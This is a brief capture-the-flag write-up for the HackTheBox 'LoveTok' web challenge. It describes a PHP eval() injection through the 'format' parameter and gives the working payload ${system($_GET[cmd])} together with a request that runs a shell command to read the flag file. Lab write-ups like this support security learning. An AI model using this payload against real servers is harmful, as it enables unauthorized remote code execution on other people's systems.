Challenge: LoveTok (HTB)<br>
Category: Web  <br>
Difficulty: Easy  <br>
Vulnerability: Remote Code Execution via PHP eval() function (system() injection) 
<br>
<h1>Description</h1>
The “format” parameter is passed directly into a PHP eval() call.  
By injecting `${system($_GET[cmd])}` into “format”, you can execute arbitrary shell commands on the server.

<ul>
  <li>Send a GET request to http://{HOST}/?format=${system($_GET[cmd])}&cmd=cat /flag* to read the flag.</li>
  <li>Extract the flag file path from the response.</li>
</ul>
